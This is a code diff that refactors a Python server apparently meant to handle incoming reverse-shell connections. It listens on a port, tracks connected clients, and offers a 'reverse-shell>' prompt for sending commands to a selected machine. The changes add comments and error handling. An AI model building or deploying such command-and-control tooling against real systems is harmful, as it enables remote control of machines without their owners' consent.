@@ -10,21 +10,24 @@ class Server(object):
     addresses = []
     connections = []
 
+    # creates socket, waits for connections from clients, and initiates the prompt for the user
     def start(self):
         print("Starting server...")
         self.create_socket()
         self.create_threads()
 
+    # creates a socket to accept connections from clients
     def create_socket(self):
         print("Configuring socket...")
         try:
             self.sckt = socket.socket()
             self.sckt.bind(("", 10101))
             self.sckt.listen(5)
-        except socket.error as message:
-            print(message)
+        except socket.error:
+            print("\n - error: unable to configure socket")
             sys.exit()
 
+    # creates 2 threads to simultaneously accept connections from clients and manage the prompt for the user
     def create_threads(self):
         print("Creating threads...")
         for number in range(2):
@@ -36,11 +39,16 @@ class Server(object):
             thread.daemon = True
             thread.start()
 
+    # accepts connections from clients and adds them to the lists of available connections and addresses
     def accept_connections(self):
-        connection, address = self.sckt.accept()
-        self.connections.append(connection)
-        self.addresses.append(address)
+        try:
+            connection, address = self.sckt.accept()
+            self.connections.append(connection)
+            self.addresses.append(address)
+        except socket.error:
+            print("\n - error: unable to accept connection")
 
+    # manages the prompt for the user based on what he or she entered
     def show_prompt(self):
         while True:
             command = raw_input("\nreverse-shell> ")
@@ -50,15 +58,12 @@ class Server(object):
             elif command == "list":
                 self.show_connections()
             elif command[:6] == "select":
-                if self.error_check_for_send_commands(command[7:]):
+                if not self.error_check_for_send_commands(command[7:]):
                     self.send_commands(int(command[7:]))
             else:
                 print("\n- command not recognized")
 
-    def remove_connection(self, index):
-        del self.addresses[index]
-        del self.connections[index]
-
+    # shows a list of available connections to the user on the prompt
     def show_connections(self):
         print("---------- Connections ----------")
         for index, address in enumerate(self.addresses):
@@ -72,6 +77,24 @@ class Server(object):
         if len(self.connections) == 0:
             print("    no available connections")
 
+    # checks whether the user entered the argument for the 'select' command appropriately
+    def error_check_for_send_commands(self, argument):
+        if not argument.isdigit():
+            print("\n- " + argument + " is not a number")
+            return True
+        index = int(argument)
+        if index >= len(self.connections):
+            print("\n- connection " + str(index) + " is not an available connection")
+            print("- use command 'list' to see all available connections")
+            return True
+        elif self.connections[index] is None:
+            print("\n- connection " + str(index) + " is no longer available")
+            print("- use command 'list' to see all available connections")
+            self.remove_connection(index)
+            return True
+        return False
+
+    # sends the commands the user entered for the selected client
     def send_commands(self, index):
         print("")
         while True:
@@ -87,22 +110,12 @@ class Server(object):
                     print("\n - error: lost connection")
                     break
 
-    def error_check_for_send_commands(self, argument):
-        if not argument.isdigit():
-            print("\n- " + argument + " is not a number")
-            return False
-        index = int(argument)
-        if index >= len(self.connections):
-            print("\n- connection " + str(index) + " is not an available connection")
-            print("- use command 'list' to see all available connections")
-            return False
-        elif self.connections[index] is None:
-            print("\n- connection " + str(index) + " is no longer available")
-            print("- use command 'list' to see all available connections")
-            self.remove_connection(index)
-            return False
-        return True
+    # removes a connection by index from the lists of available connections and addresses
+    def remove_connection(self, index):
+        del self.addresses[index]
+        del self.connections[index]
 
+    # closes all available connections and the socket once the user has finished
     def close_connections(self):
         for connection in self.connections:
             connection.close()
